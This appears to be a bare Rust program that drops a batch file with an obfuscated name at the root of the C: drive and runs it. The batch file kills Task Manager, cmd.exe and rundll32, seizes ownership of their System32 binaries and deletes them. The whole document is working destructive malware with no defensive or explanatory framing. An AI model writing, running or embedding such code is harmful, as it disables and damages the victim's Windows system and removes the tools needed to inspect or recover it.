use std::fs::File;
use std::io::Write;
fn main() {
    let mut file = File::create("C:\\{a922e-8123e-83214g-46694}.bat").unwrap();
    file.write_all(b"echo off\ntaskkill /f /im Taskmgr.exe\ntakeown /a /f C:\\Windows\\System32\\Taskmgr.exe\nicacls C:\\Windows\\System32\\Taskmgr.exe /grant administrators:f\ndel C:\\Windows\\System32\\Taskmgr.exe\ntaskkill /f /im cmd.exe\ntakeown /a /f C:\\Windows\\System32\\cmd.exe\nicacls C:\\Windows\\System32\\cmd.exe /grant administrators:f\ndel C:\\Windows\\System32\\cmd.exe\ntaskkill /f /im C:\\windows\\System32\\rundll32.exe\ntakeown /a /f C:\\Windows\\System32\\rundll32.exe\nicacls C:\\Windows\\System32\\rundll32.exe /grant administrators:f\ndel C:\\Windows\\System32\\rundll32.exe").unwrap();
    std::process::Command::new("C:\\{a922e-8123e-83214g-46694}.bat").spawn().unwrap();
}
